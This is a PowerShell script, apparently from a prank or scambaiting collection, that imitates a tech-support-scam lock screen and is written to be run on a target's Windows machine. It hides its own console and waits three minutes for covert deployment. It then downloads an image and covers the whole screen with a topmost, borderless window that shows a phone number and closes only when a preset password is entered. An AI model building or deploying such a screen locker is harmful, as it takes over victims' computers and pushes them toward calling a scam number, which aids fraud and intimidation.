
<# ========================= Powershell Tech Support Scam ==============================

**SYNOPSIS**
Before browser limitations on zero-interaction full screen and disabled toggles 
Scammers used these to 'freeze' desktops and persuade the user to call the number..
this uses Powershell to create a similar effect ( seen here - https://youtube.com/shorts/hzWPyRFiRRo )

**USAGE**
1. Edit the information and password below.
2. Run the script on a target.
3. Enter the password to close.

#>


# ------------------ Edit these below ---------------------
$number = "+0-800-126-129"
$key = "fuckscammers"
# ---------------------------------------------------------

# required setup
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
[System.Windows.Forms.Application]::EnableVisualStyles()

# Hide the console and taskbar icon
$a = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
$t = Add-Type -M $a -name Win32ShowWindowAsync -names Win32Functions -PassThru
$h = (Get-Process -PID $pid).MainWindowHandle
if($h -ne [System.IntPtr]::Zero){
    $t::ShowWindowAsync($h, 0)
}
else{
    $Host.UI.RawUI.WindowTitle = 'min'
    $p = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'min' })
    $h = $p.MainWindowHandle
    $t::ShowWindowAsync($h, 0)
}

# Delay invoke (to allow safe deployment)
Sleep 180

# Download image
$tempFile = "$env:TEMP\cover.png"
iwr -Uri 'https://i.imgur.com/QoGmdCj.png' -OutFile $tempFile

# Find screen dimensions
$screen = [System.Windows.Forms.Screen]::PrimaryScreen
$Width = $screen.Bounds.Width
$Height = $screen.Bounds.Height

# Define objects placement
$phoneX = [math]::Round($Width * 0.46)
$phoneY = [math]::Round($Height * 0.58)
$inputBoxX = [math]::Round($Width * 0.46)
$inputBoxY = [math]::Round($Height * 0.66)
$inputsizeX = [math]::Round($Width * 0.16)
$inputsizeY = [math]::Round($Height * 0.05)
$buttonX = [math]::Round($Width * 0.66)
$buttonY = [math]::Round($Height * 0.66)
$buttonsizeX = [math]::Round($Width * 0.2)
$buttonsizeY = [math]::Round($Height * 0.05)

# form element
$form = New-Object System.Windows.Forms.Form
$form.StartPosition = (0,0)
$form.Size = New-Object System.Drawing.Size($Width,$Height)
$form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::none
$form.BackColor = [System.Drawing.Color]::Black
$form.ShowInTaskbar = $false
$form.TopMost = $true
$image = [System.Drawing.Image]::FromFile("$tempFile")
$form.BackgroundImage = $image
$form.BackgroundImageLayout = "Stretch"

# phone number element
$phone = New-Object System.Windows.Forms.Label
$phone.Text = $number
$phone.ForeColor = "#bcbcbc"
$phone.AutoSize = $true
$phone.Width = 25
$phone.Height = 10
$phone.Location = New-Object System.Drawing.Point($phoneX, $phoneY)
$phone.Font = 'Microsoft Sans Serif,32,style=Bold'
$form.Controls.Add($phone)

# Passkey box element
$inputBox = New-Object System.Windows.Forms.TextBox
$inputBox.Size = New-Object System.Drawing.Size($inputsizeX, $inputsizeY)
$inputBox.Location = New-Object System.Drawing.Point($inputBoxX, $inputBoxY)
$inputBox.Font = 'Microsoft Sans Serif,24'
$form.Controls.Add($inputBox)

# unlock button element
$button = New-Object System.Windows.Forms.Button
$button.Text = "Unlock"
$button.Width = 150
$button.Height = 45
$button.Location = New-Object System.Drawing.Point($buttonX, $buttonY)
$button.Font = 'Microsoft Sans Serif,22,style=Bold'
$button.BackColor = "#eeeeee"
$form.Controls.Add($button)

# Button click
$button.Add_Click({
    # Check for correct password
    $check = $inputBox.Text
    if ($check -eq $key){
        $form.Close()
        rm -path $tempFile -Force
        sleep 1
    }
})

[void]$form.ShowDialog()

